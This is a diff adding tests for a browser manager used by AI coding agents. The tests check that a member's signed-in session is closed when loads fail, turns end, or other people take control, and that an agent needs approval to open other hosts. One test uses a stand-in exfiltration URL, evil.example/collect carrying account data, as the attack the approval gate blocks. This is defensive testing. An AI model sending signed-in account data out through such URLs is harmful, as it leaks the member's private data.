@@ -318,6 +318,10 @@ class ScriptedChild implements ManagedChild {
   signedIn = false;
   /** 19: the next `act` tries to leave the locked site for this origin. */
   blockNext: string | null = null;
+  /** HI-01: `openWithState` rejects with this code (after reporting the page), as a timed-out or failed load does. */
+  failLoad: string | null = null;
+  /** HI-02: `openWithState` answers only once this settles (the member's turn may end meanwhile). */
+  holdLoad: Promise<void> | null = null;
 
   constructor(private readonly o: ChildFactoryOptions) {
     this.closed = new Promise((r) => {
@@ -327,6 +331,14 @@ class ScriptedChild implements ManagedChild {
 
   async call(op: string, input: Readonly<Record<string, unknown>>): Promise<unknown> {
     this.calls.push({ op, input: { ...input } });
+    if (op === "openWithState" && this.holdLoad) await this.holdLoad;
+    if (op === "openWithState" && this.failLoad) {
+      // The child may still have opened the signed-in page before its answer: the page is reported.
+      const origin = originOf(new URL(String(input.url)).href);
+      if (origin) this.o.onEvent({ event: "navigated", origin });
+      this.signedIn = true;
+      throw Object.assign(new Error("scripted"), { code: this.failLoad });
+    }
     if (op === "open" || op === "openWithState") {
       const url = new URL(String(input.url));
       const origin = originOf(url.href);
@@ -1146,6 +1158,381 @@ describe("signin load and unload (07.13-19 Task 3: D-24 … D-26, D-32, PD-16, P
       expect(browserEvents(t).map((e) => e.kind)).toContain("signin_unloaded");
       expect(t.manager.openPages).toBe(0);
     }
+  });
+
+  it("HI-01: a load that fails or times out closes the child before it reports signin_unloaded", async () => {
+    for (const code of ["timeout", "navigation_refused", "browser_unavailable"]) {
+      const states: string[] = [];
+      const t = scripted(
+        {
+          link: {
+            send: (f) => {
+              t.frames.push(f);
+              if (f.type === "browser.event" && f.kind === "signin_unloaded") {
+                states.push(t.children[0]?.state ?? "none");
+              }
+              if (f.type === "browser.signin.load") {
+                setImmediate(() => {
+                  const result = HAS_SIGNIN(f);
+                  if (result) {
+                    void t.manager.onServerFrame({
+                      type: "browser.signin.state",
+                      requestId: f.requestId,
+                      result,
+                    });
+                  }
+                });
+              }
+            },
+            sendBinary: () => false,
+          },
+          createChild: (o) => {
+            const c = new ScriptedChild(o);
+            c.failLoad = code;
+            t.children.push(c);
+            return c;
+          },
+        },
+        HAS_SIGNIN,
+      );
+      t.turn(SIGNIN);
+      const res = await t.tools.call("open", { url: `${SITE}/account` });
+      expect(res.isError, code).toBe(true);
+      // The child that may hold the member's state is gone, and only then the API hears it is unloaded.
+      expect(t.children[0]?.state, code).toBe("closed");
+      expect(states, code).toEqual(["closed"]);
+      expect(t.manager.openPages, code).toBe(0);
+      // A later call finds no page (never the signed-in one).
+      expect((await t.tools.call("snapshot", {})).summary, code).toBe(
+        "Refused: No page is open. Open one first.",
+      );
+    }
+  });
+
+  it("HI-02: a turn that ends while the sign-in loads closes the late page at once; it is never kept loaded", async () => {
+    const { order, put } = sequenced();
+    let release: () => void = () => {};
+    const hold = new Promise<void>((r) => {
+      release = r;
+    });
+    const t = scripted(
+      {
+        api: { put },
+        createChild: (o) => {
+          const c = new ScriptedChild(o);
+          c.holdLoad = hold;
+          t.children.push(c);
+          return c;
+        },
+        link: {
+          send: (f) => {
+            t.frames.push(f);
+            if (f.type === "browser.event") order.push(`${f.kind}:${t.children[0]?.state ?? "none"}`);
+            if (f.type === "browser.signin.load") {
+              setImmediate(() => {
+                const result = HAS_SIGNIN(f);
+                if (result) {
+                  void t.manager.onServerFrame({
+                    type: "browser.signin.state",
+                    requestId: f.requestId,
+                    result,
+                  });
+                }
+              });
+            }
+          },
+          sendBinary: () => false,
+        },
+      },
+      HAS_SIGNIN,
+    );
+    const promptId = t.turn(SIGNIN);
+    const opening = t.tools.call("open", { url: `${SITE}/account` });
+    for (let i = 0; i < 100 && !t.children[0]?.calls.some((c) => c.op === "openWithState"); i++)
+      await flush();
+    expect(t.children[0]?.calls.some((c) => c.op === "openWithState")).toBe(true);
+    // The member presses Stop: the turn completes while the child still loads their state.
+    t.manager.onTurnEnded(t.sid, promptId);
+    release();
+    const res = await opening;
+    expect(res.isError).toBe(true);
+    // The late signed-in page was re-sealed and closed, and only then reported unloaded; never reported loaded.
+    expect(put).toHaveBeenCalledTimes(1);
+    expect(t.children[0]?.state).toBe("closed");
+    expect(t.manager.openPages).toBe(0);
+    const kinds = order.filter((o) => !o.startsWith("put "));
+    expect(kinds.some((k) => k.startsWith("signin_loaded"))).toBe(false);
+    expect(kinds).toContain("signin_unloaded:closed");
+    // The next person's turn finds no page at all.
+    t.turn({ ...ALLOW, askerId: OTHER_MEMBER });
+    expect((await t.tools.call("snapshot", {})).summary).toBe("Refused: No page is open. Open one first.");
+  });
+
+  it("HI-03: a lease that may be someone else's closes the member's signed-in page before it applies", async () => {
+    const { put } = sequenced();
+    const t = scripted({ api: { put } }, HAS_SIGNIN);
+    t.turn(SIGNIN);
+    await t.tools.call("open", { url: `${SITE}/account` });
+    // Another person's prompt reached the device (queued behind the member's turn): the API may let them take control.
+    t.manager.onPrompt(t.sid, "queued-by-other", { ...SIGNIN, askerId: OTHER_MEMBER });
+    const leaseId = randomUUID();
+    await t.manager.onServerFrame({ type: "browser.lease", sessionId: t.sid, leaseId, state: "held" });
+    // Re-sealed, closed and reported unloaded; nothing of it reaches the holder.
+    expect(put).toHaveBeenCalledTimes(1);
+    expect(t.children[0]?.state).toBe("closed");
+    expect(t.manager.openPages).toBe(0);
+    expect(browserEvents(t).map((e) => e.kind)).toContain("signin_unloaded");
+    await t.manager.onServerFrame({
+      type: "browser.input",
+      sessionId: t.sid,
+      leaseId,
+      events: [{ type: "key", event: "down", key: "a", code: "KeyA", modifiers: 0 }],
+    } as never);
+    expect(t.children[0]?.calls.some((c) => c.op === "input")).toBe(false);
+  });
+
+  it("HI-03: a lease while a bot's or nobody's turn could be the asker also closes the signed-in page", async () => {
+    const t = scripted({}, HAS_SIGNIN);
+    t.turn(SIGNIN);
+    await t.tools.call("open", { url: `${SITE}/account` });
+    t.manager.onPrompt(t.sid, "queued-by-bot", { ...SIGNIN, askerId: null, askerIsBot: true } as never);
+    await t.manager.onServerFrame({
+      type: "browser.lease",
+      sessionId: t.sid,
+      leaseId: randomUUID(),
+      state: "held",
+    });
+    expect(t.manager.openPages).toBe(0);
+  });
+
+  it("HI-03: a lease taken while the member's state loads closes the page the load opened", async () => {
+    let release: () => void = () => {};
+    const hold = new Promise<void>((r) => {
+      release = r;
+    });
+    const t = scripted(
+      {
+        createChild: (o) => {
+          const c = new ScriptedChild(o);
+          c.holdLoad = hold;
+          t.children.push(c);
+          return c;
+        },
+      },
+      HAS_SIGNIN,
+    );
+    t.turn(SIGNIN);
+    const opening = t.tools.call("open", { url: `${SITE}/account` });
+    for (let i = 0; i < 100 && !t.children[0]?.calls.some((c) => c.op === "openWithState"); i++)
+      await flush();
+    t.manager.onPrompt(t.sid, "queued-by-other", { ...SIGNIN, askerId: OTHER_MEMBER });
+    await t.manager.onServerFrame({
+      type: "browser.lease",
+      sessionId: t.sid,
+      leaseId: randomUUID(),
+      state: "held",
+    });
+    release();
+    expect((await opening).isError).toBe(true);
+    expect(t.children[0]?.state).toBe("closed");
+    expect(browserEvents(t).map((e) => e.kind)).not.toContain("signin_loaded");
+  });
+
+  it("HI-03: the member's own lease keeps their signed-in page and pauses the agent", async () => {
+    const { put } = sequenced();
+    const t = scripted({ api: { put } }, HAS_SIGNIN);
+    t.turn(SIGNIN);
+    await t.tools.call("open", { url: `${SITE}/account` });
+    await t.manager.onServerFrame({
+      type: "browser.lease",
+      sessionId: t.sid,
+      leaseId: randomUUID(),
+      state: "held",
+    });
+    expect(put).not.toHaveBeenCalled();
+    expect(t.manager.openPages).toBe(1);
+    expect((await t.tools.call("snapshot", {})).summary).toBe(
+      "Refused: A person is controlling the page. Try again later.",
+    );
+  });
+
+  it("HI-04: after a sign-in loaded, an open to another host asks the member even in Full access, loopback too", async () => {
+    const t = scripted({}, HAS_SIGNIN);
+    t.turn(SIGNIN, true);
+    await t.tools.call("open", { url: `${SITE}/account` });
+    const child = t.children[0] as ScriptedChild;
+
+    // The data the agent read may ride the address: the member decides; Full access skips nothing.
+    const evil = t.tools.call("open", { url: "https://evil.example/collect?d=account-data" });
+    const ask = await nextApproval(t, 1);
+    expect(ask.browser).toEqual({
+      kind: "signed_in_host",
+      origin: "https://evil.example:443",
+      tool: "ocw_browser_open",
+    });
+    expect(ask.summary).not.toContain("account-data");
+    expect(ask.summary).not.toContain("/collect");
+    t.manager.resolveApproval(t.sid, ask.approvalId, "deny");
+    expect((await evil).summary).toBe("Refused: The person you asked did not allow this.");
+    // Denied: the signed-in page stays and nothing else opened.
+    expect(child.state).toBe("running");
+    expect(child.calls.filter((c) => c.op === "open")).toEqual([]);
+
+    // A loopback host asks too.
+    const local = t.tools.call("open", { url: "http://localhost:4000/" });
+    const ask2 = await nextApproval(t, 2);
+    expect(ask2.browser?.kind).toBe("signed_in_host");
+    t.manager.resolveApproval(t.sid, ask2.approvalId, "once");
+    expect((await local).isError).toBe(false);
+
+    // Sticky for the rest of the turn: the signed-in page is closed now, and a third host still needs the member.
+    const third = t.tools.call("open", { url: "http://127.0.0.1:7000/" });
+    const ask3 = await nextApproval(t, 3);
+    expect(ask3.browser?.kind).toBe("signed_in_host");
+    t.manager.resolveApproval(t.sid, ask3.approvalId, "deny");
+    expect((await third).isError).toBe(true);
+    // A host the member allowed in this turn does not ask again.
+    expect((await t.tools.call("open", { url: "http://localhost:4000/other" })).isError).toBe(false);
+    expect(t.approvals()).toHaveLength(3);
+
+    // The next turn starts clean: loopback opens without asking.
+    t.turn(SIGNIN, true);
+    expect((await t.tools.call("open", { url: "http://127.0.0.1:7000/" })).isError).toBe(false);
+    expect(t.approvals()).toHaveLength(3);
+  });
+
+  it("HI-04: a redirect away from the member's site, or a later call on a page that left it, asks the member", async () => {
+    const t = scripted({}, HAS_SIGNIN);
+    t.turn(SIGNIN, true);
+    await t.tools.call("open", { url: `${SITE}/account` });
+    const local = t.tools.call("open", { url: "http://localhost:4000/" });
+    t.manager.resolveApproval(t.sid, (await nextApproval(t, 1)).approvalId, "once");
+    await local;
+    // The public page navigated on its own to another host (a script, a meta refresh).
+    const child = t.children.at(-1) as ScriptedChild;
+    (child as unknown as { o: ChildFactoryOptions }).o.onEvent({
+      event: "navigated",
+      origin: "https://evil.example:443",
+    });
+    const snap = t.tools.call("snapshot", {});
+    const ask = await nextApproval(t, 2);
+    expect(ask.browser).toMatchObject({ kind: "signed_in_host", origin: "https://evil.example:443" });
+    t.manager.resolveApproval(t.sid, ask.approvalId, "deny");
+    expect((await snap).isError).toBe(true);
+    // Closing the page sends nothing anywhere: it never asks.
+    expect((await t.tools.call("close", {})).isError).toBe(false);
+    expect(t.approvals()).toHaveLength(2);
+  });
+
+  it("LO-04: another person's steer into the member's running turn unloads the sign-in before it runs", async () => {
+    const { put } = sequenced();
+    const t = scripted({ api: { put } }, HAS_SIGNIN);
+    t.turn(SIGNIN);
+    await t.tools.call("open", { url: `${SITE}/account` });
+    // Codex steers: the steer's prompt starts inside the running turn (no prompt.completed in between).
+    t.manager.onPrompt(t.sid, "steer-1", { ...SIGNIN, askerId: OTHER_MEMBER }, { steer: true });
+    t.manager.onTurnStarted(t.sid, "steer-1");
+    for (let i = 0; i < 50 && !browserEvents(t).some((e) => e.kind === "signin_unloaded"); i++) await flush();
+    expect(put).toHaveBeenCalledTimes(1);
+    expect(t.manager.openPages).toBe(0);
+    expect(browserEvents(t).map((e) => e.kind)).toContain("signin_unloaded");
+    // What the agent already read stays in the model's context: the member data stays sticky in the steered turn.
+    const local = t.tools.call("open", { url: "http://localhost:4000/" });
+    const ask = await nextApproval(t, 1);
+    expect(ask.browser?.kind).toBe("signed_in_host");
+    t.manager.resolveApproval(t.sid, ask.approvalId, "deny");
+    expect((await local).isError).toBe(true);
+    // And no sign-in loads in it.
+    expect(t.frames.filter((f) => f.type === "browser.signin.load")).toHaveLength(1);
+  });
+
+  it("LO-04: the member's own steer keeps their sign-in loaded", async () => {
+    const { put } = sequenced();
+    const t = scripted({ api: { put } }, HAS_SIGNIN);
+    t.turn(SIGNIN);
+    await t.tools.call("open", { url: `${SITE}/account` });
+    t.manager.onPrompt(t.sid, "steer-1", SIGNIN, { steer: true });
+    t.manager.onTurnStarted(t.sid, "steer-1");
+    await flush();
+    expect(put).not.toHaveBeenCalled();
+    expect(t.manager.openPages).toBe(1);
+    expect((await t.tools.call("snapshot", {})).isError).toBe(false);
+  });
+
+  describe("HI-06: a Codex session's sign-in never loads while another person's session runs on the device", () => {
+    /** Another session on the same device, whose latest prompt is `grant`'s. */
+    const other = (t: ReturnType<typeof scripted>, grant: SessionBrowserGrant) => {
+      const id = randomUUID();
+      t.manager.forSession(id);
+      t.manager.onPrompt(id, null, grant);
+      return id;
+    };
+
+    it("a shim-driven session opens public pages only while someone else's session is live; Claude's still loads", async () => {
+      // Codex: the session's shim token exists, so any agent of this OS user could reach it over the control socket.
+      const t = scripted({}, HAS_SIGNIN);
+      await t.tools.shimTokenFile();
+      other(t, { ...ALLOW, askerId: OTHER_MEMBER });
+      t.turn(SIGNIN);
+      const res = await t.tools.call("open", { url: `${SITE}/account` });
+      expect(textOf(res)).toContain("Signed in: no");
+      expect(textOf(res)).toContain("another person's session runs on this device");
+      expect(t.frames.some((f) => f.type === "browser.signin.load")).toBe(false);
+      expect(t.children[0]?.calls.some((c) => c.op === "openWithState")).toBe(false);
+
+      // Claude: no shim token, no control-socket path into the session.
+      const c = scripted({}, HAS_SIGNIN);
+      other(c, { ...ALLOW, askerId: OTHER_MEMBER });
+      c.turn(SIGNIN);
+      expect(textOf(await c.tools.call("open", { url: `${SITE}/account` }))).toContain("Signed in: yes");
+    });
+
+    it("the member's own other private session, or none at all, does not block the load", async () => {
+      const t = scripted({}, HAS_SIGNIN);
+      await t.tools.shimTokenFile();
+      other(t, SIGNIN);
+      t.turn(SIGNIN);
+      expect(textOf(await t.tools.call("open", { url: `${SITE}/account` }))).toContain("Signed in: yes");
+    });
+
+    it("a bot's session, a wider session or one with no grant blocks the load", async () => {
+      for (const grant of [
+        { ...SIGNIN, askerIsBot: true },
+        { ...ALLOW, signinAllowed: false },
+        undefined,
+      ] as const) {
+        const t = scripted({}, HAS_SIGNIN);
+        await t.tools.shimTokenFile();
+        other(t, grant as SessionBrowserGrant);
+        t.turn(SIGNIN);
+        expect(textOf(await t.tools.call("open", { url: `${SITE}/account` }))).toContain("Signed in: no");
+      }
+    });
+
+    it("another person's session that starts while the sign-in is loaded unloads it at once", async () => {
+      const { put } = sequenced();
+      const t = scripted({ api: { put } }, HAS_SIGNIN);
+      await t.tools.shimTokenFile();
+      t.turn(SIGNIN);
+      await t.tools.call("open", { url: `${SITE}/account` });
+      expect(t.manager.openPages).toBe(1);
+      other(t, { ...ALLOW, askerId: OTHER_MEMBER });
+      for (let i = 0; i < 50 && !browserEvents(t).some((e) => e.kind === "signin_unloaded"); i++)
+        await flush();
+      expect(put).toHaveBeenCalledTimes(1);
+      expect(t.children[0]?.state).toBe("closed");
+    });
+
+    it("signin answers that sign-ins do not work while another person's session runs here", async () => {
+      const t = scripted({}, HAS_SIGNIN);
+      await t.tools.shimTokenFile();
+      other(t, { ...ALLOW, askerId: OTHER_MEMBER });
+      t.turn(SIGNIN);
+      const res = await t.tools.call("signin", { host: SITE_HOST, reason: REASON });
+      expect(res.isError).toBe(true);
+      expect(textOf(res)).toContain("another person's session runs on this device");
+      expect(t.approvals()).toEqual([]);
+    });
   });
 
   it("unload: a revoked sign-in closes the page without re-sealing it", async () => {
